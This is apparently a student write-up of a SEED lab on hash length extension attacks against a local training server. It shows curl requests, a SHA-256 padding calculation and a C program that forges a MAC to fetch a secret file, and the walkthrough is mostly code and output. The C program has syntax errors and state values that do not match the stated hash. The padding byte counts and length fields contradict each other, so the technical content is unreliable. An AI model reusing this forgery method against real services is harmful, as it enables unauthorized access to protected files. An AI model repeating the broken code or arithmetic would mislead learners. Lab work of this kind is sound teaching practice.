# Hash Length Extension Attack

## Setup
As the website we were supossed to use is not up anymore we need to run it locally with the following docker configuration.
```yml
version: "3"

services:
    web-server:
        build: ./image_flask
        image: seed-image-flask-len-ext
        container_name: www-10.9.0.80
        tty: true
        cap_add:
            - ALL
        networks:
            net-10.9.0.0:
                ipv4_address: 10.9.0.80
        ports:
            - "8080:80"   

networks:
    net-10.9.0.0:
        name: net-10.9.0.0
        ipam:
            config:
                - subnet: 10.9.0.0/24

```

## Tasks

### Send Request to List Files

In this task, we are asked to send a simple request to the server to list the files in its current directory. The request's format is as follows:

```
http://localhost:8080/?myname=<name>&uid=<need-to-fill>
&lstcmd=1&mac=<need-to-calculate>
```

Assuming the selected uid is 1001, the corresponding key will be 123456. In order to calculate the MAC of the message to send, we use the format Key:R, being the key 123456, as mentioned, and R equal to the contents of the request, excluding everything but the argument part. In our case, this would be something like:

```
123456:myname=Cardoso&uid=1001&lstcmd=1
```

Then, we can calculate the MAC, which is a sha256 checksum.

```sh
╰─ echo -n "123456:myname=Cardoso&uid=1001&lstcmd=1" | sha256sum

9fa3a7c20e55669dd17505f9db0ace8ae38a74cf610c37e3c379b392a98c61f6
```
We then construct the complete request and send it to the server program. This is given by the URL: 

http://localhost:8080/?myname=Cardoso&uid=1001&lstcmd=1&mac=9fa3a7c20e55669dd17505f9db0ace8ae38a74cf610c37e3c379b392a98c61f6

Using the command line:
```sh
curl http://localhost:8080/?myname=Cardoso&uid=1001&lstcmd=1&mac=9fa3a7c20e55669dd17505f9db0ace8ae38a74cf610c37e3c379b392a98c61f6
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Length Extension Lab</title>
</head>
<body>
    <nav class="navbar fixed-top navbar-light" style="background-color: #3EA055;">
        <a class="navbar-brand" href="#" >
            SEEDLabs
        </a>
    </nav>

    <div style="padding-top: 50px; text-align: center;">
        <h2><b>Hash Length Extension Attack Lab</b></h2>
        <div style="max-width: 35%; text-align: center; margin: auto;">
            
                <b>Yes, your MAC is valid</b>
                
                    <h3>List Directory</h3>
                    <ol>
                        
                            <li>key.txt</li>
                        
                            <li>secret.txt</li>
                        
                    </ol>
                

                
            
        </div>
    </div>
</body>
</html>%     
```

```sh
╰─ echo -n "123456:myname=Cardoso&uid=1001&lstcmd=1&download=secret.txt" | sha256sum

a674640e6f74e5382222299d0090824114ab7dda3d22d6ab02f43230c72bdb72  -
```

```sh
curl http://localhost:8080/\?myname\=Cardoso\&uid\=1001\&lstcmd\=1\&download\=secret.txt\&mac\=a674640e6f74e5382222299d0090824114ab7dda3d22d6ab02f43230c72bdb72      
```

```hmtl
<h3>File Content</h3>

    <p>TOP SECRET.</p>

    <p>DO NOT DISCLOSE.</p>

    <p></p>
```

### Create Padding
In this task, we are asked to calculate the padding of the message:

`123456:myname=Cardoso&uid=1001&lstcmd=1`

```md
123456             → 6
:                  → 1
myname=Cardoso     → 14
&uid=1001          → 9
&lstcmd=1          → 9
Total              → 6 + 1 + 14 + 9 + 9 = 39 bytes

```

SHA-256 uses 64-byte blocks. So we need to pad the message so its length becomes a multiple of 64 bytes.
SHA-256 padding steps:

- Add a single 0x80 byte (that's \x80)
- Add enough 0x00 bytes to make the message 8 bytes short of a multiple of 64
- Add a 64-bit (8-byte) big-endian representation of the message length in bits.

Message Lenght in bits : `39 bytes × 8 = 312 bits → 0x0138 in hex`

Current length: 39
We need to make it: 64 - 8 = 56 bytes before appending the 8-byte length

So:

- Current: 39 bytes
- We add: 1 byte (\x80) → now at 40 bytes
- Then: 16 null bytes (\x00) → 56 bytes total
- Finally: 8-byte big-endian bit length → \x00\x00\x00\x00\x00\x00\x01\x38

Final Padding:
```
\x80
\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x01\x38
```
Encoded Padding:

```
%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01%38
```
### The Length Extension Attack

In this task, we are asked to generate a valid MAC for a URL without knowing the MAC key. We assume we know the MAC of a valid message R, and also the size of the MAC key. With the Length Extension Attack, it's possible to add a message to the end of the initial message and compute its MAC without knowing the secret MAC key.

First we calculate a MAC for the string 123456:myname=Cardoso&uid=1001&lstcmd=1:
```
 echo -n "123456:myname=Cardoso&uid=1001&lstcmd=1" | sha256sum
9fa3a7c20e55669dd17505f9db0ace8ae38a74cf610c37e3c379b392a98c61f6  
```
As it can be viewed, the output is 9fa3a7c20e55669dd17505f9db0ace8ae38a74cf610c37e3c379b392a98c61f6. Using the provided script and substituting the computed MAC with the one previously mentioned and adding the string &download=secret.txt as the extension, we can get the server program to show us the contents of the secret.txt file. The script is as follows:

```c++
/* length_ext.c */

#include <stdio.h>
#include <arpa/inet.h>
#include <openssl/sha.h>

int main(int argc, const char *argv[])
{
    int i;
    unsigned char buffer[SHA256_DIGEST_LENGTH];

    SHA256_CTX c;
    SHA256_Init(&c);

    for(i=0; i<64; i++)
        SHA256_Update(&c, "*", 1);

    // MAC of the original message M (padded)
    c.h[0] = htole32(0x9fa3a7c2);
    c.h[1] = htole32(0xf2eb89dc);
    c.h[2] = htole32(0x9dd17505);,
    c.h[3] = htole32(0xf9db0ace);,
    c.h[4] = htole32(0x8ae38a74);,
    c.h[5] = htole32(0xcf610c37e);,
    c.h[6] = htole32(0x3c379b39);
    c.h[7] = htole32(0x2a98c61f6);

    // Append additional message
    SHA256_Update(&c, "&download=secret.txt", 20);
    SHA256_Final(buffer, &c);
    
    for(i = 0; i < 32; i++) {
        printf("%02x", buffer[i]);
    }

    printf("\n");
    return 0;
}
```
Compiling and running the C script, we get the new message's MAC.

```
╰─ ./length_ext                                                                  
8e8f85a2baa57e8655581adec8ba3040594ebeb70271a27095f2588cc52b77ea
```

By, filling the URL format presented above with the padding previous calculated, we get the following result:

```sh
curl http://www.seedlab-hashlen.com/\?myname=Cardoso\&uid=1001\&lstcmd=1%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01%40\&download=secret.txt\&mac=8e8f85a2baa57e8655581adec8ba3040594ebeb70271a27095f2588cc52b77ea
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Length Extension Lab</title>
</head>
<body>
    <nav class="navbar fixed-top navbar-light" style="background-color: #3EA055;">
        <a class="navbar-brand" href="#" >
            SEEDLabs
        </a>
    </nav>

    <div style="padding-top: 50px; text-align: center;">
        <h2><b>Hash Length Extension Attack Lab</b></h2>
        <div style="max-width: 35%; text-align: center; margin: auto;">
            
                <b>Yes, your MAC is valid</b>
                

                
                    <h3>File Content</h3>
                    
                        <p>TOP SECRET.</p>
                    
                        <p>DO NOT DISCLOSE.</p>
                    
                        <p></p>
                    
                
            
        </div>
    </div>
</body>
</html>
```
